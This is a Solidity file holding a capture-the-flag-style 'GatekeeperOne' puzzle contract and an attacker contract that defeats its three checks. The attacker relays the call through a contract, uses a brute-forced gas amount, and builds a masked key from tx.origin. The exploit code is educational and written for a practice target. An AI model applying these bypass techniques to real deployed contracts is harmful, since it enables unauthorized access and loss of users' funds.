// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import 'hardhat/console.sol';

contract GatekeeperOne {
  address public entrant;

  modifier gateOne() {
    // uint256 startGas = gasleft();

    require(msg.sender != tx.origin);
    // uint256 gasUsed = startGas - gasleft();
    // console.log('gasUsed %s ', gasUsed);

    _;
  }

  modifier gateTwo() {
    // uint256 startGas = gasleft();

    require(gasleft() % 8191 == 0);
    // uint256 gasUsed = startGas - gasleft();
    // console.log('gasUsed %s ', gasUsed);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(
      uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
      'GatekeeperOne: invalid gateThree part one'
    );
    require(
      uint32(uint64(_gateKey)) != uint64(_gateKey),
      'GatekeeperOne: invalid gateThree part two'
    );
    require(
      uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
      'GatekeeperOne: invalid gateThree part three'
    );

    _;
  }

  function enter(
    bytes8 _gateKey
  ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperOneAttacker {
  constructor(GatekeeperOne victim_) {
    // for (uint256 i = 0; i <= ; i++) {
    //   try victim_.enter{gas: 600000 + i}(0) {
    //     console.log('passed with gas ->', 600000 + i);
    //     break;
    //   } catch {}
    // }
    // 606405

    // bytes4 a = 0xffffffff;
    // bytes4 mask = 0xf0f0f0f0;
    // bytes4 result = a & mask; // 0xf0f0f0f0

    bytes8 key = bytes8(uint64(uint160(address(tx.origin)))) &
      0xFFFFFFFF0000FFFF;

    victim_.enter{gas: 606405}(bytes8(key));
  }
}
